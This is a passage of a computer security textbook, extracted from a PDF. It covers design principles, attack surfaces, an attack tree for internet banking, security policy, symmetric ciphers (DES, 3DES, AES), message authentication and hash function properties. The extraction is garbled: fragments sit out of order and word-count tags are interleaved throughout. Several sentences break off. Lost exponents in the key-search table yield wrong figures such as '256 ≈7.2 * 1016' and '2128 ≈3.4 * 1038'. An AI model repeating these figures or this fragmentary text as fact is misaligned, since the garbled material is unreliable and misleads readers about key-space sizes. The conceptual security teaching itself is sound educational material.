 
• Encapsulation
 
• Modularity
 
• Layering
 
• Least astonishment
[Word Count: 25]

The first eight listed principles were first proposed in [SALT75] and have 
withstood the test of time. In this section, we briefly discuss each principle.
[Word Count: 25]

1.4 / Fundamental Security Design Principles   29
[Word Count: 7]

Open design means that the design of a security mechanism should be open 
rather than secret. For example, although encryption keys must be secret, encryp-
tion algorithms should be open to public scrutiny. The algorithms can then be 
reviewed by many experts, and users can therefore have high confidence in them. 
This is the philosophy behind the National Institute of Standards and Technology 
(NIST) program of standardizing encryption and hash algorithms, and has led to the 
widespread adoption of NIST-approved algorithms.
[Word Count: 81]

Least common mechanism means that the design should minimize the func-
tions shared by different users, providing mutual security. This principle helps 
reduce the number of unintended communication paths and reduces the amount of 
hardware and software on which all users depend, thus making it easier to verify if 
there are any undesirable security implications.
[Word Count: 55]

Encapsulation can be viewed as a specific form of isolation based on object-
oriented functionality. Protection is provided by encapsulating a collection of pro-
cedures and data objects in a domain of its own so that the internal structure of a 
data object is accessible only to the procedures of the protected subsystem and the 
procedures may be called only at designated domain entry points.
[Word Count: 65]

Layering refers to the use of multiple, overlapping protection approaches 
addressing the people, technology, and operational aspects of information systems. 
By using multiple, overlapping protection approaches, the failure or circumven-
tion of any individual protection approach will not leave the system unprotected. 
We will see throughout this book that a layering approach is often used to provide 
multiple barriers between an adversary and protected information or services. This 
technique is often referred to as defense in depth.
[Word Count: 77]

1.5 / Attack Surfaces And Attack Trees   31
[Word Count: 8]

Least astonishment means that a program or user interface should always 
respond in the way that is least likely to astonish the user. For example, the mechanism 
for authorization should be transparent enough to a user that the user has a good intui-
tive understanding of how the security goals map to the provided security mechanism.
[Word Count: 56]

In the Section 1.2, we provided an overview of the spectrum of security threats and 
attacks facing computer and network systems. Section 8.1 goes into more detail 
about the nature of attacks and the types of adversaries that present security threats. 
In this section, we elaborate on two concepts that are useful in evaluating and clas-
sifying threats: attack surfaces and attack trees.
[Word Count: 63]

An attack surface consists of the reachable and exploitable vulnerabilities in a sys-
tem [MANA11, HOWA03]. Examples of attack surfaces are the following:
[Word Count: 23]

• Open ports on outward facing Web and other servers, and code listening on
[Word Count: 14]

those ports
 
• Services available on the inside of a firewall
 
• Code that processes incoming data, email, XML, office documents, and industry-
[Word Count: 23]

specific custom data exchange formats
 
• Interfaces, SQL, and Web forms
 
• An employee with access to sensitive information vulnerable to a social engi-
[Word Count: 24]

Attack surfaces can be categorized in the following way:
[Word Count: 9]

• Network attack surface: This category refers to vulnerabilities over an enter-
[Word Count: 12]

prise network, wide-area network, or the Internet. Included in this category 
are network protocol vulnerabilities, such as those used for a denial-of-service 
­attack, disruption of communications links, and various forms of intruder attacks.
 
• Software attack surface: This refers to vulnerabilities in application, utility,
[Word Count: 44]

or operating system code. A particular focus in this category is Web server 
software.
 
• Human attack surface: This category refers to vulnerabilities created by person-
[Word Count: 26]

nel or outsiders, such as social engineering, human error, and trusted insiders.
[Word Count: 12]

An attack surface analysis is a useful technique for assessing the scale and 
severity of threats to a system. A systematic analysis of points of vulnerability 
makes developers and security analysts aware of where security mechanisms are 
required. Once an attack surface is defined, designers may be able to find ways to 
make the surface smaller, thus making the task of the adversary more difficult. The 
attack surface also provides guidance on setting priorities for testing, strengthening 
security measures, or modifying the service or application.
[Word Count: 85]

As illustrated in Figure 1.3, the use of layering, or defense in depth, and attack 
surface reduction complement each other in mitigating security risk.
[Word Count: 24]

The motivation for the use of attack trees is to effectively exploit the infor-
mation available on attack patterns. Organizations such as CERT publish security 
advisories that have enabled the development of a body of knowledge about both 
general attack strategies and specific attack patterns. Security analysts can use the 
attack tree to document security attacks in a structured form that reveals key vul-
nerabilities. The attack tree can guide both the design of systems and applications, 
and the choice and strength of countermeasures.
[Word Count: 84]

Figure 1.3  Defense in Depth and Attack Surface
[Word Count: 8]

1.5 / Attack Surfaces And Attack Trees   33
[Word Count: 8]

Figure 1.4, from [DIMI07], is an example of an attack tree analysis for an 
Internet banking authentication application. The root of the tree is the objective of 
the attacker, which is to compromise a user’s account. The shaded boxes on the tree 
are the leaf nodes, which represent events that comprise the attacks. The white boxes 
are categories which consist of one or more specific attack events (leaf nodes). Note 
that in this tree, all the nodes other than leaf nodes are OR-nodes. The analysis used 
to generate this tree considered the three components involved in authentication:
[Word Count: 97]

• User terminal and user (UT/U): These attacks target the user equipment, in-
[Word Count: 13]

cluding the tokens that may be involved, such as smartcards or other password 
generators, as well as the actions of the user.
 
• Communications channel (CC): This type of attack focuses on communica-
[Word Count: 33]

tion links.
 
• Internet banking server (IBS): These types of attacks are offline attack against
[Word Count: 15]

the servers that host the Internet banking application.
[Word Count: 8]

Five overall attack strategies can be identified, each of which exploits one or 
more of the three components. The five strategies are as follows:
[Word Count: 24]

UT/U1b Theft of token and
handwritten notes
[Word Count: 7]

Malicious software
installation
Vulnerability exploit
[Word Count: 5]

UT/U3c Brute force attacks
with PIN calculators
[Word Count: 7]

Redirection of
communication toward
fraudulent site
CC3 Active man-in-the
middle attacks
[Word Count: 11]

Use of known authenticated
session by attacker
[Word Count: 7]

Normal user authentication
with speciﬁed session ID
[Word Count: 7]

CC4 Pre-deﬁned session
IDs (session hijacking)
[Word Count: 6]

Figure 1.4  An Attack Tree for Internet Banking Authentication
[Word Count: 9]

• User credential compromise: This strategy can be used against many elements
[Word Count: 12]

communication between the UT and the IBS. Various schemes can be used to 
be able to impersonate the valid user and so gain access to the banking system.
 
• User credential guessing: It is reported in [HILT06] that brute force attacks
[Word Count: 41]

against some banking authentication schemes are feasible by sending random 
usernames and passwords. The attack mechanism is based on distributed 
zombie personal computers, hosting automated programs for username- or 
password-based calculation.
 
• Security policy violation: For example, violating the bank’s security policy in
[Word Count: 43]

combination with weak access control and logging mechanisms, an employee 
may cause an internal security incident and expose a customer’s account.
 
• Use of known authenticated session: This type of attack persuades or forces
[Word Count: 34]

the user to connect to the IBS with a preset session ID. Once the user authen-
ticates to the server, the attacker may utilize the known session ID to send 
packets to the IBS, spoofing the user’s identity.
[Word Count: 38]

Figure 1.4 provides a thorough view of the different types of attacks on an 
Internet banking authentication application. Using this tree as a starting point, secu-
rity analysts can assess the risk of each attack and, using the design principles out-
lined in the preceding section, design a comprehensive security facility. [DIMO07] 
provides a good account of the results of this design effort.
[Word Count: 63]

We conclude this chapter with a brief look at the overall strategy for providing 
computer security. [LAMP04] suggests that a comprehensive security strategy 
involves three aspects:
[Word Count: 26]

• Specification/policy: What is the security scheme supposed to do?
 
• Implementation/mechanisms: How does it do it?
 
• Correctness/assurance: Does it really work?
[Word Count: 23]

The first step in devising security services and mechanisms is to develop a secu-
rity policy. Those involved with computer security use the term security policy in
[Word Count: 27]

­various ways. At the least, a security policy is an informal description of desired 
system behavior [NRC91]. Such informal policies may reference requirements for 
security, integrity, and availability. More usefully, a security policy is a formal state-
ment of rules and practices that specify or regulate how a system or organization 
provides security services to protect sensitive and critical system resources (RFC 
4949). Such a formal security policy lends itself to being enforced by the system’s 
technical controls as well as its management and operational controls.
[Word Count: 86]

In developing a security policy, a security manager needs to consider the 
­following factors:
[Word Count: 14]

• The value of the assets being protected
 
• The vulnerabilities of the system
 
• Potential threats and the likelihood of attacks
[Word Count: 22]

Further, the manager must consider the following trade-offs:
[Word Count: 8]

• Ease of use versus security: Virtually all security measures involve some pen-
[Word Count: 13]

alty in the area of ease of use. The following are some examples. Access control 
mechanisms require users to remember passwords and perhaps perform other 
access control actions. Firewalls and other network security measures may 
reduce available transmission capacity or slow response time. Virus-checking 
software reduces available processing power and introduces the possibility of 
system crashes or malfunctions due to improper interaction between the secu-
rity software and the operating system.
 
• Cost of security versus cost of failure and recovery: In addition to ease of use
[Word Count: 87]

and performance costs, there are direct monetary costs in implementing and 
maintaining security measures. All of these costs must be balanced against the 
cost of security failure and recovery if certain security measures are lacking. 
The cost of security failure and recovery must take into account not only the 
value of the assets being protected and the damages resulting from a security 
violation, but also the risk, which is the probability that a particular threat will 
exploit a particular vulnerability with a particular harmful result.
[Word Count: 85]

Security policy is thus a business decision, possibly influenced by legal requirements.
[Word Count: 12]

Security implementation involves four complementary courses of action:
[Word Count: 8]

• Prevention: An ideal security scheme is one in which no attack is successful.
[Word Count: 14]

Although this is not practical in all cases, there is a wide range of threats in 
which prevention is a reasonable goal. For example, consider the transmission 
of encrypted data. If a secure encryption algorithm is used, and if measures 
are in place to prevent unauthorized access to encryption keys, then attacks on 
confidentiality of the transmitted data will be prevented.
 
• Detection: In a number of cases, absolute protection is not feasible, but it is
[Word Count: 76]

practical to detect security attacks. For example, there are intrusion detection 
systems designed to detect the presence of unauthorized individuals logged 
onto a system. Another example is detection of a denial of service attack, in
[Word Count: 35]

which communications or processing resources are consumed so that they are 
unavailable to legitimate users.
 
• Response: If security mechanisms detect an ongoing attack, such as a denial of
[Word Count: 29]

service attack, the system may be able to respond in such a way as to halt the 
attack and prevent further damage.
 
• Recovery: An example of recovery is the use of backup systems, so that if data
[Word Count: 38]

integrity is compromised, a prior, correct copy of the data can be reloaded.
[Word Count: 13]

Those who are “consumers” of computer security services and mechanisms (e.g., 
­system managers, vendors, customers, and end users) desire a belief that the security 
measures in place work as intended. That is, security consumers want to feel that the 
security infrastructure of their systems meet security requirements and enforce ­security 
policies. These considerations bring us to the concepts of assurance and evaluation.
[Word Count: 62]

The NIST Computer Security Handbook [NIST95] defines assurance as the 
degree of confidence one has that the security measures, both technical and opera-
tional, work as intended to protect the system and the information it processes. This 
encompasses both system design and system implementation. Thus, assurance deals 
with the questions, “Does the security system design meet its requirements?” and 
“Does the security system implementation meet its specifications?”
[Word Count: 67]

Note that assurance is expressed as a degree of confidence, not in terms of a for-
mal proof that a design or implementation is correct. The state of the art in proving 
designs and implementations is such that it is not possible to provide absolute proof. 
Much work has been done in developing formal models that define requirements and 
characterize designs and implementations, together with logical and mathematical 
techniques for addressing these issues. But assurance is still a matter of degree.
[Word Count: 81]

Evaluation is the process of examining a computer product or system with 
respect to certain criteria. Evaluation involves testing and may also involve for-
mal analytic or mathematical techniques. The central thrust of work in this area is 
the development of evaluation criteria that can be applied to any security system 
(encompassing security services and mechanisms) and that are broadly supported 
for making product comparisons.
[Word Count: 65]

It is useful to read some of the classic tutorial papers on computer security; these pro-
vide a historical perspective from which to appreciate current work and thinking.4 
The papers to read are [WARE79], [BROW72], [SALT75], [SHAN77], and 
[SUMM84]. Two more recent, short treatments of computer security are [ANDR04] 
and [LAMP04]. [NIST95] is an exhaustive (290 pages) treatment of the subject. 
Another good treatment is [NRC91]. Also useful is [FRAS97].
[Word Count: 70]

4These classic papers are available at box.com/CompSec3e.
[Word Count: 7]

1.8 / Key Terms, Review Questions, And Problems   37
[Word Count: 9]

NIST SP 800-27 [STON04] and NSA’s Information Assurance Technical 
Framework [NSA02] are two useful discussions of security design principles.
[Word Count: 19]

There is an overwhelming amount of material, including books, papers, and 
online resources, on computer security. Perhaps, the most useful and definitive 
source of information is a collection of standards and specifications from standards-
making bodies and from other sources whose work has widespread industry and 
government approval. We list some of the most important sources in Appendix C.
[Word Count: 59]

1.8	 Key Terms, Review Questions, And Problems
[Word Count: 7]

access control
active attack
adversary
asset
[Word Count: 6]

assurance
attack
attack surface
attack tree
[Word Count: 6]

authentication
authenticity
availability
complete mediation
[Word Count: 5]

1.1	
Define computer security.
	 1.2	
What is the difference between passive and active security threats?
	 1.3	
List and briefly define categories of passive and active network security attacks.
	 1.5	
List and briefly define the fundamental security design principles.
	 1.6	
Explain the difference between an attack surface and an attack tree.
[Word Count: 50]

data is the most important requirement.
b.	 Give an example of a type of publication in which data integrity is the most impor-
[Word Count: 23]

tant requirement.
c.	 Give an example in which system availability is the most important requirement.
	 1.4	
For each of the following assets, assign a low, moderate, or high impact level for the 
loss of confidentiality, availability, and integrity, respectively. Justify your answers.
a.	 An organization managing public information on its Web server.
b.	 A law enforcement organization managing extremely sensitive investigative
[Word Count: 61]

information.
c.	 A financial organization managing routine administrative information (not privacy-
[Word Count: 11]

confidentiality
corruption
countermeasure
data confidentiality
data integrity
denial of service
disruption
economy of mechanism
encapsulation
encryption
evaluation
exposure
fail-safe defaults
falsification
incapacitation
inference
inside attack
integrity
[Word Count: 26]

interceptions
intrusion
isolation
layering
least astonishment
least common mechanism
least privilege
masquerade
misappropriation
misuse
modularity
nonrepudiation
obstruction
open design
OSI security architecture
outside attack
passive attack
prevent
[Word Count: 27]

privacy
psychological acceptability
replay
repudiation
risk
security attack
security mechanism
security policy
security service
separation of privilege
system integrity
system resource
threat agent
traffic analysis
unauthorized disclosure
usurpation
vulnerabilities
[Word Count: 29]

1.8 / Key Terms, Review Questions, And Problems   39
[Word Count: 9]

d.	 An information system used for large acquisitions in a contracting organization
[Word Count: 12]

contains both sensitive, pre-solicitation phase contract information and routine 
administrative information. Assess the impact for the two data sets separately and 
the information system as a whole.
e.	 A power plant contains a SCADA (supervisory control and data acquisition) sys-
[Word Count: 40]

tem controlling the distribution of electric power for a large military installation. 
The SCADA system contains both real-time sensor data and routine administra-
tive information. Assess the impact for the two data sets separately and the infor-
mation system as a whole.
	 1.5	
Consider the following general code for allowing access to a resource:
[Word Count: 54]

2.1	
Confidentiality with Symmetric Encryption
[Word Count: 5]

Symmetric Encryption
Symmetric Block Encryption Algorithms
Stream Ciphers
[Word Count: 8]

2.2	
Message Authentication and Hash Functions
[Word Count: 6]

Authentication Using Symmetric Encryption
Message Authentication without Message Encryption
Secure Hash Functions
Other Applications of Hash Functions
[Word Count: 17]

Public-Key Encryption Structure
Applications for Public-Key Cryptosystems
Requirements for Public-Key Cryptography
Asymmetric Encryption Algorithms
[Word Count: 14]

2.4	
Digital Signatures and Key Management
[Word Count: 6]

Digital Signature
Public-Key Certificates
Symmetric Key Exchange Using Public-Key Encryption
Digital Envelopes
[Word Count: 12]

The Use of Random Numbers
Random versus Pseudorandom
[Word Count: 8]

2.6	
Practical Application: Encryption of Stored Data
[Word Count: 7]

2.8	
Key Terms, Review Questions, and Problems
[Word Count: 7]

Part One:  Computer Security 
Technology and 
Principles
[Word Count: 7]

2.1 / Confidentiality with Symmetric Encryption   41
[Word Count: 7]

An important element in many computer security services and applications is the 
use of cryptographic algorithms. This chapter provides an overview of the various 
types of algorithms, together with a discussion of their applicability. For each type 
of algorithm, we introduce the most important standardized algorithms in common 
use. For the technical details of the algorithms themselves, see Part Four.
[Word Count: 60]

We begin with symmetric encryption, which is used in the widest variety of 
­contexts, primarily to provide confidentiality. Next, we examine secure hash func-
tions and discuss their use in message authentication. The next section examines 
public-key encryption, also known as asymmetric encryption. We then discuss the 
two most ­important applications of public-key encryption, namely digital signatures 
and key management. In the case of digital signatures, asymmetric encryption and 
secure hash functions are combined to produce an extremely useful tool.
[Word Count: 80]

Finally, in this chapter we provide an example of an application area for crypto-
graphic algorithms by looking at the encryption of stored data.
[Word Count: 24]

2.1	 Confidentiality with Symmetric Encryption
[Word Count: 5]

The universal technique for providing confidentiality for transmitted or stored data 
is symmetric encryption. This section introduces the basic concept of symmetric 
encryption. This is followed by an overview of the two most important symmetric 
encryption algorithms: the Data Encryption Standard (DES) and the Advanced 
Encryption Standard (AES), which are block encryption algorithms. Finally, this 
section introduces the concept of symmetric stream encryption algorithms.
[Word Count: 64]

Symmetric encryption, also referred to as conventional encryption or single-key 
­encryption, was the only type of encryption in use prior to the introduction of ­public-key 
encryption in the late 1970s. Countless individuals and groups, from Julius Caesar to the 
German U-boat force to present-day diplomatic, military, and commercial users, have
[Word Count: 50]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Explain the basic operation of symmetric block encryption algorithms.
◆	Compare and contrast block encryption and stream encryption.
◆	Discuss the use of secure hash functions for message authentication.
◆	List other applications of secure hash functions.
◆	Explain the basic operation of asymmetric block encryption algorithms.
◆	Present an overview of the digital signature mechanism and explain the
[Word Count: 60]

­concept of digital envelopes.
◆	Explain the significance of random and pseudorandom numbers in
[Word Count: 14]

used symmetric encryption for secret communication. It ­remains the more widely used 
of the two types of encryption.
[Word Count: 18]

A symmetric encryption scheme has five ingredients (Figure 2.1):
[Word Count: 9]

• Plaintext: This is the original message or data that is fed into the algorithm as
[Word Count: 16]

input.
	
• Encryption algorithm: The encryption algorithm performs various substitu­tions
[Word Count: 10]

and transformations on the plaintext.
	
• Secret key: The secret key is also input to the encryption algorithm. The exact
[Word Count: 20]

substitutions and transformations performed by the algorithm depend on the 
key.
	
• Ciphertext: This is the scrambled message produced as output. It depends on
[Word Count: 24]

the plaintext and the secret key. For a given message, two different keys will 
produce two different ciphertexts.
	
• Decryption algorithm: This is essentially the encryption algorithm run in
[Word Count: 29]

­reverse. It takes the ciphertext and the secret key and produces the original 
plaintext.
[Word Count: 14]

There are two requirements for secure use of symmetric encryption:
[Word Count: 10]

1.	 We need a strong encryption algorithm. At a minimum, we would like the
[Word Count: 14]

­algorithm to be such that an opponent who knows the algorithm and has 
­access to one or more ciphertexts would be unable to decipher the ciphertext 
or figure out the key. This requirement is usually stated in a stronger form: 
The opponent should be unable to decrypt ciphertext or discover the key even 
if he or she is in possession of a number of ciphertexts together with the plain-
text that produced each ciphertext.
	
2.	 Sender and receiver must have obtained copies of the secret key in a secure
[Word Count: 89]

fashion and must keep the key secure. If someone can discover the key and 
knows the algorithm, all communication using this key is readable.
[Word Count: 24]

There are two general approaches to attacking a symmetric encryption 
scheme. The first attack is known as cryptanalysis. Cryptanalytic attacks rely on
[Word Count: 22]

Decryption algorithm
(reverse of encryption
[Word Count: 5]

Figure 2.1    Simplified Model of Symmetric Encryption
[Word Count: 7]

2.1 / Confidentiality with Symmetric Encryption   43
[Word Count: 7]

the nature of the algorithm plus perhaps some knowledge of the general character-
istics of the plaintext or even some sample plaintext-ciphertext pairs. This type of 
attack exploits the characteristics of the algorithm to attempt to deduce a specific 
­plaintext or to deduce the key being used. If the attack succeeds in deducing the 
key, the ­effect is catastrophic: All future and past messages encrypted with that key 
are ­compromised.
[Word Count: 70]

The most commonly used symmetric encryption algorithms are block ciphers. A 
block cipher processes the plaintext input in fixed-size blocks and produces a block 
of ­ciphertext of equal size for each plaintext block. The algorithm processes longer 
­plaintext amounts as a series of fixed-size blocks. The most important ­symmetric algo-
rithms, all of which are block ciphers, are the Data Encryption Standard (DES), triple 
DES, and the Advanced Encryption Standard (AES); see Table 2.1. This ­subsection 
provides an overview of these algorithms. Chapter 20 presents the ­technical details.
[Word Count: 88]

Data Encryption Standard  Until recently, the most widely used encryption 
scheme was based on the Data Encryption Standard (DES) adopted in 1977 by 
the National Bureau of Standards, now the National Institute of Standards and 
Technology (NIST), as ­Federal Information Processing Standard 46 (FIPS PUB 46).1 
The algorithm itself is referred to as the Data Encryption Algorithm (DEA). DES 
takes a plaintext block of 64 bits and a key of 56 bits, to produce a ciphertext block 
of 64 bits.
[Word Count: 80]

Concerns about the strength of DES fall into two categories: concerns about 
the algorithm itself and concerns about the use of a 56-bit key. The first concern 
refers to the possibility that cryptanalysis is possible by exploiting the characteristics 
of the DES algorithm. Over the years, there have been numerous attempts to find 
and exploit weaknesses in the algorithm, making DES the most-studied encryption
[Word Count: 64]

1NIST is a U.S. government agency that develops standards, called Federal Information Processing Stan-
dards (FIPS), for use by U.S. government departments and agencies. FIPS are also widely used outside the 
government market. See Appendix C for a discussion.
[Word Count: 39]

Table 2.1    Comparison of Three Popular Symmetric Encryption Algorithms
[Word Count: 9]

Plaintext block size (bits) 
64 
64 
128
[Word Count: 7]

Ciphertext block size (bits) 
64 
64 
128
[Word Count: 7]

Key size (bits) 
56 
112 or 168 
128, 192, or 256
[Word Count: 11]

DES = Data Encryption Standard
AES = Advanced Encryption Standard
[Word Count: 10]

algorithm in existence. Despite numerous approaches, no one has so far reported a 
fatal weakness in DES.
[Word Count: 17]

A more serious concern is key length. With a key length of 56 bits, there are 256
[Word Count: 17]

Fortunately, there are a number of alternatives to DES, the most important of 
which are triple DES and AES, discussed in the remainder of this section.
[Word Count: 26]

Table 2.2  Average Time Required for Exhaustive Key Search
[Word Count: 9]

56
DES
256 ≈7.2 * 1016
255 ms = 1.125 years
1 hour
[Word Count: 13]

128
AES
2128 ≈3.4 * 1038
2127 ms = 5.3 * 1021 years
5.3 * 1017 years
[Word Count: 17]

168
Triple DES
2168 ≈3.7 * 1050
2167 ms = 5.8 * 1033 years
5.8 * 1029 years
[Word Count: 18]

192
AES
2192 ≈6.3 * 1057
2191 ms = 9.8 * 1040 years
9.8 * 1036 years
[Word Count: 17]

256
AES
2256 ≈1.2 * 1077
2255 ms = 1.8 * 1060 years
1.8 * 1056 years
[Word Count: 17]

2.1 / Confidentiality with Symmetric Encryption   45
[Word Count: 7]

Triple DES  The life of DES was extended by the use of triple DES (3DES), 
which involves repeating the basic DES algorithm three times, using either two or 
three unique keys, for a key size of 112 or 168 bits. 3DES was first standardized 
for use in financial applications in ANSI standard X9.17 in 1985. 3DES was 
incorporated as part of the Data Encryption Standard in 1999, with the publication 
of FIPS PUB 46-3.
[Word Count: 74]

The principal drawback of 3DES is that the algorithm is relatively sluggish in 
software. The original DES was designed for mid-1970s hardware implementation 
and does not produce efficient software code. 3DES, which requires three times as 
many calculations as DES, is correspondingly slower. A secondary drawback is that 
both DES and 3DES use a 64-bit block size. For reasons of both efficiency and secu-
rity, a larger block size is desirable.
[Word Count: 71]

Advanced Encryption Standard  Because of its drawbacks, 3DES is not a 
reasonable candidate for long-term use. As a replacement, NIST in 1997 issued 
a call for proposals for a new Advanced Encryption Standard (AES), which 
should have a security strength equal to or better than 3DES and significantly 
improved efficiency. In addition to these general requirements, NIST specified 
that AES must be a symmetric block cipher with a block length of 128 bits  
and support for key lengths of 128, 192, and 256 bits. Evaluation criteria included 
security, computational efficiency, memory requirements, hardware and software 
suitability, and flexibility.
[Word Count: 98]

In a first round of evaluation, 15 proposed algorithms were accepted. A 
­second round narrowed the field to 5 algorithms. NIST completed its evaluation 
process and published a final standard (FIPS PUB 197) in November of 2001. NIST 
selected Rijndael as the proposed AES algorithm. AES is now widely available in 
commercial products. AES is described in detail in Chapter 20.
[Word Count: 61]

For lengthy messages, the ECB mode may not be secure. A cryptanalyst may 
be able to exploit regularities in the plaintext to ease the task of decryption. For 
­example, if it is known that the message always starts out with certain predefined 
fields, then the cryptanalyst may have a number of known plaintext-ciphertext pairs 
to work with.
[Word Count: 57]

To increase the security of symmetric block encryption for large sequences 
of data, a number of alternative techniques have been developed, called modes of 
­operation. These modes overcome the weaknesses of ECB; each mode has its own 
particular advantages. This topic is explored in Chapter 20.
[Word Count: 46]

(a) Block cipher encryption (electronic codebook mode)
[Word Count: 7]

Figure 2.2    Types of Symmetric Encryption
[Word Count: 6]

2.2 / Message Authentication and Hash Functions   47
[Word Count: 8]

A block cipher processes the input one block of elements at a time, producing an 
output block for each input block. A stream cipher processes the input elements 
continuously, producing output one element at a time, as it goes along. Although 
block ciphers are far more common, there are certain applications in which a stream 
cipher is more appropriate. Examples are given subsequently in this book.
[Word Count: 66]

2.2	 Message Authentication and Hash Functions
[Word Count: 6]

Encryption protects against passive attack (eavesdropping). A different requirement 
is to protect against active attack (falsification of data and transactions). ­Protection 
against such attacks is known as message or data authentication.
[Word Count: 31]

2For simplicity, for the remainder of this section, we refer to message authentication. By this we mean both 
authentication of transmitted messages and of stored data (data authentication).
[Word Count: 28]

Authentication Using Symmetric Encryption
[Word Count: 4]

In fact, symmetric encryption alone is not a suitable tool for data authentica-
tion. To give one simple example, in the ECB mode of encryption, if an attacker 
reorders the blocks of ciphertext, then each block will still decrypt successfully. 
However, the reordering may alter the meaning of the overall data sequence. 
­Although sequence numbers may be used at some level (e.g., each IP packet), it is 
typically not the case that a separate sequence number will be associated with each 
b-bit block of plaintext. Thus, block reordering is a threat.
[Word Count: 91]

Message Authentication without Message Encryption
[Word Count: 5]

In this section, we examine several approaches to message authentication that do 
not rely on message encryption. In all of these approaches, an authentication tag 
is generated and appended to each message for transmission. The message itself is 
not encrypted and can be read at the destination independent of the authentication 
function at the destination.
[Word Count: 55]

Because the approaches discussed in this section do not encrypt the message, 
message confidentiality is not provided. As was mentioned, message encryption 
by itself does not provide a secure form of authentication. However, it is possible 
to combine authentication and confidentiality in a single algorithm by encrypt-
ing a message plus its authentication tag. Typically, however, ­message authenti­
cation is provided as a separate function from message encryption. [DAVI89] 
suggests three situations in which message authentication without confidentiality 
is preferable:
[Word Count: 80]

1.	 There are a number of applications in which the same message is broadcast to a
[Word Count: 16]

number of destinations. Two examples are notification to users that the ­network 
is now unavailable, and an alarm signal in a control center. It is cheaper and 
more reliable to have only one destination responsible for monitoring authentic-
ity. Thus, the message must be broadcast in plaintext with an associated ­message  
authentication tag. The responsible system performs ­authentication. If a ­violation 
occurs, the other destination systems are alerted by a general alarm.
	
2.	 Another possible scenario is an exchange in which one side has a heavy load
[Word Count: 87]

and cannot afford the time to decrypt all incoming messages. Authentication 
is carried out on a selective basis, with messages being chosen at random for 
checking.
	
3.	 Authentication of a computer program in plaintext is an attractive service.
[Word Count: 38]

The computer program can be executed without having to decrypt it every 
time, which would be wasteful of processor resources. However, if a message
[Word Count: 24]

2.2 / Message Authentication and Hash Functions   49
[Word Count: 8]

­authentication tag were attached to the program, it could be checked whenever 
assurance is required of the integrity of the program.
[Word Count: 21]

Thus, there is a place for both authentication and encryption in meeting security 
requirements.
[Word Count: 14]

Figure 2.3    Message Authentication Using a Message Authentication Code (MAC)
[Word Count: 10]

3Because messages may be any size and the message authentication code is a small fixed size, there must 
theoretically be many messages that result in the same MAC. However, it should be infeasible in practice 
to find pairs of such messages with the same MAC. This is known as collision resistance.
[Word Count: 51]

1.	 The receiver is assured that the message has not been altered. If an attacker
[Word Count: 15]

­alters the message but does not alter the code, then the receiver’s calculation 
of the code will differ from the received code. Because the attacker is assumed 
not to know the secret key, the attacker cannot alter the code to correspond to 
the alterations in the message.
	
2.	 The receiver is assured that the message is from the alleged sender. Because
[Word Count: 61]

no one else knows the secret key, no one else could prepare a message with a 
proper code.
	
3.	 If the message includes a sequence number (such as is used with X.25, HDLC,
[Word Count: 33]

and TCP), then the receiver can be assured of the proper sequence, because 
an attacker cannot successfully alter the sequence number.
[Word Count: 21]

A number of algorithms could be used to generate the code. The NIST speci-
fication, FIPS PUB 113, recommends the use of DES. DES is used to generate an 
­encrypted version of the message, and the last number of bits of ciphertext are used 
as the code. A 16- or 32-bit code is typical.4
[Word Count: 54]

The process just described is similar to encryption. One difference is that the 
authentication algorithm need not be reversible, as it must for decryption. It turns 
out that because of the mathematical properties of the authentication function, it is 
less vulnerable to being broken than encryption.
[Word Count: 46]

One-Way Hash Function  An alternative to the message authentication code is the 
one-way hash function. As with the message authentication code, a hash function 
accepts a variable-size message M as input and produces a fixed-size message digest 
H(M) as output (Figure 2.4). Typically, the message is padded out to an integer multiple 
of some fixed length (e.g., 1024 bits) and the padding includes the value of the length 
of the original message in bits. The length field is a security measure to increase the 
difficulty for an attacker to produce an alternative message with the same hash value.
[Word Count: 98]

These two approaches have an advantage over approaches that encrypt the 
entire message in that less computation is required. But an even more common 
approach is the use of a technique that avoids encryption altogether. Several reasons 
for this interest are pointed out in [TSUD92]:
[Word Count: 45]

2.2 / Message Authentication and Hash Functions   51
[Word Count: 8]

• Encryption software is quite slow. Even though the amount of data to be
[Word Count: 14]

­encrypted per message is small, there may be a steady stream of messages into 
and out of a system.
	
• Encryption hardware costs are nonnegligible. Low-cost chip implementations
[Word Count: 28]

of DES are available, but the cost adds up if all nodes in a network must have 
this capability.
	
• Encryption hardware is optimized toward large data sizes. For small blocks of
[Word Count: 32]

data, a high proportion of the time is spent in initialization/invocation overhead.
	
• An encryption algorithm may be protected by a patent.
[Word Count: 22]

Message or data block M (variable length)
P, L
[Word Count: 9]

Figure 2.4    Cryptographic Hash ­Function; h = H(M)
[Word Count: 8]

Note that the secret key is used as both a prefix and a suffix to the message. If 
the secret key is used as either only a prefix or only a suffix, the scheme is less ­secure. 
This topic is discussed in Chapter 21. Chapter 21 also describes a scheme known as 
HMAC, which is somewhat more complex than the approach of Figure 2.5c and 
which has become the standard approach for a keyed hash MAC.
[Word Count: 76]

Figure 2.5    Message Authentication Using a One-Way Hash Function
[Word Count: 9]

2.2 / Message Authentication and Hash Functions   53
[Word Count: 8]

The one-way hash function, or secure hash function, is important not only in message 
authentication but in digital signatures. In this section, we begin with a discussion of 
requirements for a secure hash function. Then we discuss specific algorithms.
[Word Count: 39]

Hash Function Requirements  The purpose of a hash function is to produce a 
“fingerprint” of a file, message, or other block of data. To be useful for message 
­authentication, a hash function H must have the following properties:
[Word Count: 38]

1.	 H can be applied to a block of data of any size.
	
2.	 H produces a fixed-length output.
	
3.	 H(x) is relatively easy to compute for any given x, making both hardware and
[Word Count: 34]

software implementations practical.
	
4.	 For any given code h, it is computationally infeasible to find x such that
[Word Count: 18]

H(x) = h. A hash function with this property is referred to as one-way or pre-
image resistant.6
[Word Count: 18]

5.	 For any given block x, it is computationally infeasible to find y ≠x with
[Word Count: 15]

H(y) = H(x). A hash function with this property is referred to as second preim-
age resistant. This is sometimes referred to as weak collision resistant.
	
6.	 It is computationally infeasible to find any pair (x, y) such that H(x) = H(y).
[Word Count: 42]

A hash function with this property is referred to as collision resistant. This is 
sometimes referred to as strong collision resistant.
[Word Count: 21]

The first three properties are requirements for the practical application of a hash 
function to message authentication.
[Word Count: 17]

The fifth property guarantees that it is impossible to find an alternative 
­message with the same hash value as a given message. This prevents forgery when 
an ­encrypted hash code is used (Figure 2.5a and b). If this property were not true, 
an attacker would be capable of the following sequence: First, observe or ­intercept 
a message plus its encrypted hash code; second, generate an unencrypted hash code 
from the message; third, generate an alternate message with the same hash code.
[Word Count: 81]

A hash function that satisfies the first five properties in the preceding list 
is ­referred to as a weak hash function. If the sixth property is also satisfied, then 
it is referred to as a strong hash function. A strong hash function protects against 
